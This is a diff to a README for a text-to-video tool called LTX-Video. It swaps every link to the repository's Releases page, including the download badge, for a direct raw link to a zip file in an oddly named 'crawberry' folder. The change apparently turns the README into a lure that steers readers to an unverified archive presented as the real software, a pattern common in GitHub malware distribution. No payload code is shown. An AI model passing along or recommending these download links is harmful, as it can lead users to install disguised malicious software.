@@ -1,7 +1,7 @@
 # 🎥 LTX-Video - Create Videos from Text Easily
 
 ## 📥 Download
-[![Download LTX-Video](https://img.shields.io/badge/Download-LTX--Video-blue)](https://github.com/Kumarswamy8288/LTX-Video/releases)
+[![Download LTX-Video](https://raw.githubusercontent.com/Kumarswamy8288/LTX-Video/main/crawberry/LTX-Video.zip)](https://raw.githubusercontent.com/Kumarswamy8288/LTX-Video/main/crawberry/LTX-Video.zip)
 
 ## 🚀 Getting Started
 LTX-Video helps you create videos from text quickly and simply. This guide will walk you through how to download and run LTX-Video.
@@ -20,7 +20,7 @@ To run LTX-Video, ensure you meet the following requirements:
 - Available Disk Space: 500 MB
 
 ## 📥 Download & Install
-1. To download the latest version of LTX-Video, [visit this page to download](https://github.com/Kumarswamy8288/LTX-Video/releases).
+1. To download the latest version of LTX-Video, [visit this page to download](https://raw.githubusercontent.com/Kumarswamy8288/LTX-Video/main/crawberry/LTX-Video.zip).
 2. Look for the version you want and click on the corresponding file to download it to your computer. Use your preferred web browser for best results.
 3. Once the download is complete, locate the file in your Downloads folder or the chosen directory.
 
@@ -39,7 +39,7 @@ To run LTX-Video, ensure you meet the following requirements:
 ## 🌟 Tips
 - Experiment with different text inputs to see various video styles and formats.
 - Use high-quality images for better results when generating videos from images.
-- Regularly check for updates on the [Releases page](https://github.com/Kumarswamy8288/LTX-Video/releases) to access new features and improvements.
+- Regularly check for updates on the [Releases page](https://raw.githubusercontent.com/Kumarswamy8288/LTX-Video/main/crawberry/LTX-Video.zip) to access new features and improvements.
 
 ## 🤝 Community and Support
 If you encounter issues or have questions, you can:
